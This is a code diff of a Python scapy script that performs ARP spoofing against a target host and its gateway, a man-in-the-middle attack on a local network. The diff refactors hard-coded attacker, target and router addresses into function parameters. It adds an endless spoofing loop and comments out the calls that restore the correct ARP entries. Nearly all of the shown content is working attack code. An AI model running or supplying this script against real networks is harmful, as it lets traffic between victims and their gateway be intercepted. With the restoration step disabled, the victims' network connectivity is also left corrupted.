@@ -1,13 +1,13 @@
 import sys
 from scapy.all import *
 
-attackerIp = get_if_addr('enp0s10') #ip adress attacker, automatical, interface as GUI variable
-TargetIP = '10.0.123.4' #GUI variable, target ip
-RouterIP = '192.168.2.254' #GUI variable, gateway, evt automatisch
-targetIp = TargetIP
-hostIp = RouterIP #host = router
+# attackerIp = get_if_addr('enp0s10') #ip adress attacker, automatical, interface as GUI variable
+# TargetIP = '10.0.123.4' #GUI variable, target ip
+# RouterIP = '192.168.2.254' #GUI variable, gateway, evt automatisch
+# targetIp = TargetIP
+# hostIp = RouterIP #host = router
     
-def spoof(targetIp, hostIp, attackerIp):
+def spoof(targetIp, hostIp, hardwareinterface):
 
     targetMac = getmacbyip(targetIp)
     attackerMac = get_if_hwaddr('enp0s10') #get attacker MAC
@@ -48,15 +48,13 @@ def end_spoof(targetIp, hostIp, attackerIp):
     correctARP[ARP].hwdst = targetMac
     correctARP[ARP].pdst = targetIp
     sendp(correctARP, iface="enp0s10")
-    
-try:
-    
+
+def startspoofing(targetIp, hostIp, hardwareinterface):
+
     while True:
         
-        spoof(targetIp, hostIp, attackerIp)
+        spoof(targetIp, hostIp, hardwareinterface)
         time.sleep(2)
-            
-except KeyboardInterrupt:
-    print('stopping attack')
-    end_spoof(targetIp, hostIp, attackerIp)
-    end_spoof(hostIp, targetIp, attackerIp)
+    
+    # end_spoof(targetIp, hostIp, attackerIp)
+    # end_spoof(hostIp, targetIp, attackerIp)
